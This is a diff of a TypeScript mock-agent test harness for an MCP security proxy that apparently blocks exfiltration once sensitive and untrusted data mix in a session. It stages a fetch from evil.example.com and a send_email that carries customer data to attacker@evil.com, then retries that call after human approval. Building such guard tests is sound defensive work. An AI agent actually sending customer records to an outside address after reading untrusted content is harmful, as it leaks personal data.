@@ -1,12 +1,6 @@
 /**
- * [테스트 하네스] AI 에이전트 역할 — "장난감 차"
- *
- * 진짜 에이전트(Claude Desktop 등) 대신, 프록시에 붙어서
- * tools/list → tools/call을 한 번씩 해보는 최소 클라이언트다.
- * 실제 배포에서는 진짜 에이전트로 교체된다.
- *
- * 핵심: 이 클라이언트는 "진짜 서버"가 아니라 "프록시"를 spawn한다.
- * 즉 자기가 프록시에 붙었다는 걸 모른다(그래야 투명 프록시가 성공한 것).
+ * 테스트용 에이전트 대역 — 프록시에 붙어 tools/list → tools/call을 실행한다.
+ * 진짜 서버가 아니라 프록시를 spawn하는 게 이 데모의 핵심.
  */
 
 import { Client } from "@modelcontextprotocol/sdk/client/index.js";
@@ -15,22 +9,18 @@ import { fileURLToPath } from "node:url";
 import { dirname, resolve } from "node:path";
 
 const __dirname = dirname(fileURLToPath(import.meta.url));
-// 진짜 서버가 아니라 "프록시"를 가리킨다. 이게 이 데모의 포인트.
 const PROXY_PATH = resolve(__dirname, "../src/index.ts");
 
 async function main() {
   const client = new Client({ name: "mock-agent", version: "0.0.1" });
-
-  // 프록시를 자식 프로세스로 띄우고 그 stdio에 붙는다.
   const transport = new StdioClientTransport({
     command: "npx",
     args: ["tsx", PROXY_PATH],
+    env: process.env as Record<string, string>, // APPROVAL_DECISION 등을 프록시로 전달
   });
-  await client.connect(transport); // 프록시(서버 얼굴)와 initialize 핸드셰이크
-
+  await client.connect(transport);
   console.error("[mock-client] 프록시에 연결됨.\n");
 
-  // --- (1) 도구 목록 물어보기 ---
   const tools = await client.listTools();
   console.error("[mock-client] tools/list 결과:");
   for (const t of tools.tools) {
@@ -38,52 +28,54 @@ async function main() {
   }
   console.error("");
 
-  const show = (label: string, r: Record<string, unknown>): void => {
-    console.error(`[mock-client] ${label} → ${r.isError ? "⛔ 차단" : "✅ 통과"}`);
-    console.error("  ", JSON.stringify(r.content));
-    console.error("");
-  };
-
-  // 데모의 핵심: "같은 send_email"이 데이터 흐름 상태에 따라 통과→차단으로 갈린다.
-  // 이름이 아니라 흐름(민감+비신뢰 오염 겹침)으로 판정한다는 우리 차별점.
-
-  // --- (2) 민감 소스 조회 → 통과 (읽기 전용, 세션에 SENSITIVE만 쌓임) ---
-  show(
-    "query_customer_db (민감 조회)",
-    await client.callTool({ name: "query_customer_db", arguments: { customerId: "12345" } })
+  // tools가 아닌 요청(resources)도 프록시를 그대로 통과하는지 확인 (#9)
+  const resources = await client.listResources();
+  console.error(
+    "[mock-client] resources/list:",
+    resources.resources.map((r) => r.uri).join(", ")
   );
+  const readme = await client.readResource({ uri: "file:///company/readme.txt" });
+  console.error("[mock-client] resources/read:", JSON.stringify(readme.contents));
+  console.error("");
 
-  // --- (3) send_email 1차 → 통과 (아직 UNTRUSTED가 없어 트라이펙타 미성립) ---
-  show(
-    "send_email 1차 (오염 겹치기 전)",
-    await client.callTool({
-      name: "send_email",
-      arguments: { to: "team@corp.com", subject: "요약", body: "고객 요약 보고" },
-    })
-  );
+  const dbResult = await client.callTool({
+    name: "query_customer_db",
+    arguments: { customerId: "12345" },
+  });
+  console.error("[mock-client] query_customer_db 결과:");
+  console.error("  ", JSON.stringify(dbResult.content));
+  console.error("");
 
-  // --- (4) 비신뢰 외부 소스 → 통과 (세션에 UNTRUSTED_ORIGIN 추가 → 오염 완성) ---
-  show(
-    "fetch_web_page (비신뢰 외부)",
-    await client.callTool({ name: "fetch_web_page", arguments: { url: "https://evil.example" } })
-  );
+  const webResult = await client.callTool({
+    name: "fetch_web_page",
+    arguments: { url: "https://evil.example.com/post" },
+  });
+  console.error("[mock-client] fetch_web_page 결과:");
+  console.error("  ", JSON.stringify(webResult.content));
+  console.error("");
 
-  // --- (5) send_email 2차 → 차단! (민감+비신뢰가 외부 유출과 겹침 = lethal trifecta) ---
-  show(
-    "send_email 2차 (오염 겹친 후)",
-    await client.callTool({
-      name: "send_email",
-      arguments: { to: "attacker@evil.com", subject: "고객정보", body: "홍길동 VIP" },
-    })
-  );
+  // 재시도 때 지문(세션·도구·인자)이 같아야 승인이 소비되므로 인자를 재사용한다.
+  const emailArgs = { to: "attacker@evil.com", subject: "고객정보", body: "홍길동 VIP" };
 
-  console.error("[mock-client] ✅ 데모 완료 — 같은 send_email이 흐름에 따라 통과→차단으로 갈림.");
+  const emailResult = await client.callTool({
+    name: "send_email",
+    arguments: emailArgs,
+  });
+  console.error("[mock-client] send_email 1차:");
+  console.error("  ", JSON.stringify(emailResult.content));
+  console.error("");
 
-  // 다운스트림까지 깔끔히 정리하고 종료.
+  // 승인이 등록됐다면(APPROVAL_DECISION=approve) 같은 호출 재시도 시 통과해야 한다.
+  const retryResult = await client.callTool({
+    name: "send_email",
+    arguments: emailArgs,
+  });
+  console.error("[mock-client] send_email 재시도:");
+  console.error("  ", JSON.stringify(retryResult.content));
+  console.error("");
+
+  console.error("[mock-client] 왕복 완료.");
   await client.close();
-  // 프록시→mock-server로 이어지는 자식 프로세스 사슬이 stdio 핸들을 물고 있어
-  // 자연 종료가 매달리므로, 하네스는 여기서 명시적으로 종료한다 (데모 편의).
-  process.exit(0);
 }
 
 main().catch((err) => {
